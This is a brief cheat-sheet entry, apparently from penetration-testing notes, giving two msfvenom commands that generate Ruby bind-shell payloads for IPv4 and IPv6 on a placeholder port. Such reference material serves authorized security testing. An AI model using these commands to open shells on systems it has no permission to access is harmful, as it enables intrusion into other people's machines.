# Ruby

## 01 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/bind_ruby lport=<PORT>

$ msfvenom -p cmd/unix/bind_ruby_ipv6 lport=<PORT>
```